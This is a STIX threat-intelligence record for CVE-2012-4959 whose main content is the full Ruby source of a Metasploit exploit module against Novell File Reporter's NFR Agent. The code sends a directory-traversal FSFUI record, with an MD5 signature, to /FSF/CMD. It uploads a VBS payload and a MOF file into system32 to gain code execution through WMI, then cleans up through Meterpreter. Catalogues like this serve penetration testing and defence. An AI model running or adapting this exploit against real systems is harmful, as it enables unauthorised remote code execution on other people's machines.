{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f17deda6-b6be-4007-a75b-5e9cb9f4c2ff",
    "created": "2024-08-14T16:38:49.039512Z",
    "modified": "2024-08-14T16:38:49.039516Z",
    "name": "NFR Agent FSFUI Record File Upload RCE",
    "description": " NFRAgent.exe, a component of Novell File Reporter (NFR), allows remote attackers to upload arbitrary files via a directory traversal while handling requests to /FSF/CMD with FSFUI records with UICMD 130. This module has been tested successfully against NFR Agent 1.0.4.3 (File Reporter 1.0.2) and NFR Agent 1.0.3.22 (File Reporter 1.0.1).  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/novell/file_reporter_fsfui_upload.rb",
            "external_id": "file_reporter_fsfui_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-4959"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2012/11/16/nfr-agent-buffer-vulnerabilites-cve-2012-4959"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n  include Msf::Exploit::WbemExec\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'NFR Agent FSFUI Record File Upload RCE',\n        'Description' => %q{\n          NFRAgent.exe, a component of Novell File Reporter (NFR), allows remote attackers to upload\n          arbitrary files via a directory traversal while handling requests to /FSF/CMD with\n          FSFUI records with UICMD 130. This module has been tested successfully against NFR\n          Agent 1.0.4.3 (File Reporter 1.0.2) and NFR Agent 1.0.3.22 (File Reporter 1.0.1).\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'juan vazquez'\n        ],\n        'References' => [\n          [ 'CVE', '2012-4959'],\n          [ 'OSVDB', '87573' ],\n          [ 'URL', 'https://www.rapid7.com/blog/post/2012/11/16/nfr-agent-buffer-vulnerabilites-cve-2012-4959' ]\n        ],\n        'Payload' => {\n          'Space' => 2048,\n          'StackAdjustment' => -3500\n        },\n        'DefaultOptions' => {\n          'WfsDelay' => 20\n        },\n        'Platform' => 'win',\n        'Targets' => [\n          # Windows before Vista\n          [ 'Automatic', {} ]\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2012-11-16',\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_delete_file\n              stdapi_sys_config_getenv\n              stdapi_sys_process_execute\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(3037),\n        OptBool.new('SSL', [true, 'Use SSL', true]),\n        OptInt.new('DEPTH', [true, 'Traversal depth', 6])\n      ]\n    )\n\n    self.needs_cleanup = true\n  end\n\n  def on_new_session(client)\n    return if not @var_mof_name\n    return if not @var_vbs_name\n\n    if client.type != \"meterpreter\"\n      print_error(\"NOTE: you must use a Meterpreter payload in order to automatically clean up.\")\n      print_error(\"The following files must be removed manually:\")\n      print_error(\"The VBS payload: %WINDIR%\\\\system32\\\\#{@var_vbs_name}.vbs\")\n      print_error(\"The MOF file (%WINDIR%\\\\system32\\\\wbem\\\\mof\\\\good\\\\#{@var_mof_name}.mof)\")\n      return # That's it\n    end\n\n    # stdapi must be loaded before we can use fs.file\n    client.core.use(\"stdapi\") if not client.ext.aliases.include?(\"stdapi\")\n\n    begin\n      print_good(\"Deleting the VBS payload \\\"#{@var_vbs_name}.vbs\\\" ...\")\n      windir = client.sys.config.getenv('WINDIR')\n      client.fs.file.rm(\"#{windir}\\\\system32\\\\\" + @var_vbs_name + \".vbs\")\n      print_good(\"Deleting the MOF file \\\"#{@var_mof_name}.mof\\\" ...\")\n      cmd = \"#{windir}\\\\system32\\\\attrib.exe -r \" +\n            \"#{windir}\\\\system32\\\\wbem\\\\mof\\\\good\\\\\" + @var_mof_name + \".mof\"\n      client.sys.process.execute(cmd, nil, { 'Hidden' => true })\n      client.fs.file.rm(\"#{windir}\\\\system32\\\\wbem\\\\mof\\\\good\\\\\" + @var_mof_name + \".mof\")\n    rescue ::Exception => e\n      print_error(\"Exception: #{e.inspect}\")\n    end\n  end\n\n  def exploit\n    # In order to save binary data to the file system the payload is written to a .vbs\n    # file and execute it from there.\n    @var_mof_name = rand_text_alpha(rand(5) + 5)\n    @var_vbs_name = rand_text_alpha(rand(5) + 5)\n\n    print_status(\"Encoding payload into VBS...\")\n    payload = generate_payload_exe\n    vbs_content = Msf::Util::EXE.to_exe_vbs(payload)\n\n    print_status(\"Generating VBS file...\")\n    mof_content = generate_mof(\"#{@var_mof_name}.mof\", \"#{@var_vbs_name}.vbs\")\n\n    print_status(\"Uploading the VBS file\")\n    worked = upload_file(\"WINDOWS\\\\system32\\\\#{@var_vbs_name}.vbs\", vbs_content)\n    unless worked\n      fail_with(Failure::NotVulnerable, \"Failed to upload the file\")\n    end\n\n    print_status(\"Uploading the MOF file\")\n    upload_file(\"WINDOWS\\\\system32\\\\wbem\\\\mof\\\\#{@var_mof_name}.mof\", mof_content)\n  end\n\n  def upload_file(filename, content)\n    traversal = \"..\\\\\" * datastore['DEPTH']\n    traversal << filename\n\n    record = \"<RECORD><NAME>FSFUI</NAME><UICMD>130</UICMD><FILE>#{traversal}</FILE><![CDATA[#{content}]]></RECORD>\"\n    md5 = Rex::Text.md5(\"SRS\" + record + \"SERVER\").upcase\n    message = md5 + record\n\n    res = send_request_cgi(\n      {\n        'uri' => '/FSF/CMD',\n        'version' => '1.1',\n        'method' => 'POST',\n        'ctype' => \"text/xml\",\n        'data' => message\n      }\n    )\n\n    if res and res.code == 200 and res.body.include? \"<RESULT><VERSION>1</VERSION><STATUS>0</STATUS></RESULT>\"\n      print_warning(\"File successfully uploaded: #{filename}\")\n    else\n      print_error(\"Failed to upload the file\")\n      return false\n    end\n\n    true\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-11-16",
    "x_mitre_platforms": [
        "win'"
    ]
}